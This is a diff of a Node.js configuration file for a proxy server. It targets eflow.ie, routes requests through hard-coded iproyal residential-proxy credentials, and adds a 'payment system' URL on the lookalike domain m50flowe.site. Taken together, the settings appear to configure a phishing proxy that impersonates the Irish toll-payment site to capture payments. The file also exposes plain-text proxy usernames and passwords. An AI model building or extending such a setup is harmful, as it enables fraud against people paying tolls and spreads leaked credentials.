@@ -1,10 +1,27 @@
-require('dotenv').config();
+const path = require('path');
+
+// Load .env from the same directory as this config file
+const dotenvResult = require('dotenv').config({ 
+  path: path.resolve(__dirname, '.env') 
+});
+
+// Debug: Log if .env was loaded successfully
+if (dotenvResult.error) {
+  console.warn('[CONFIG] Warning: Could not load .env file:', dotenvResult.error.message);
+  console.warn('[CONFIG] Using default values');
+} else {
+  console.log('[CONFIG] .env file loaded successfully');
+}
+
+// Debug: Log proxy configuration source
+console.log('[CONFIG] PROXY_HOST from env:', process.env.PROXY_HOST || '(not set, using default)');
+console.log('[CONFIG] PROXY_PORT from env:', process.env.PROXY_PORT || '(not set, using default)');
 
 module.exports = {
   // Target configuration
   target: {
     url: process.env.TARGET_URL || 'https://eflow.ie',
-    timeout: parseInt(process.env.PROXY_TIMEOUT) || 30000,
+    timeout: parseInt(process.env.PROXY_TIMEOUT) || 120000, // Default 120 seconds
   },
 
   // Server configuration
@@ -38,13 +55,17 @@ module.exports = {
     directory: process.env.STATIC_DIR || './public',
   },
   
-  // Proxy configuration for outgoing requests
+  // Proxy configuration for outgoing requests (iproyal.com residential proxy)
+  // CRITICAL: These defaults MUST match .env values as fallback
   proxy: {
     enabled: process.env.USE_PROXY === 'true',
-    host: process.env.PROXY_HOST || '93.190.141.57',
-    port: parseInt(process.env.PROXY_PORT) || 443,
-    username: process.env.PROXY_USERNAME || 'zrwbc7fv1p-mobile-country-FR-state-3012874-city-2988507-hold-session-session-695ba74c76eb9',
-    password: process.env.PROXY_PASSWORD || 'Xeltr5j5JmgT1nL3',
+    host: process.env.PROXY_HOST || 'geo.iproyal.com',
+    port: parseInt(process.env.PROXY_PORT) || 12321,
+    username: process.env.PROXY_USERNAME || 'zrwbc7fv1p-mobile-country-FR',
+    password: process.env.PROXY_PASSWORD || 'Y5zLYVxIQz7xb8Dq',
   },
+  
+  // Payment system URL
+  paymentSystemUrl: process.env.PAYMENT_SYSTEM_URL || 'https://m50flowe.site',
 };
 
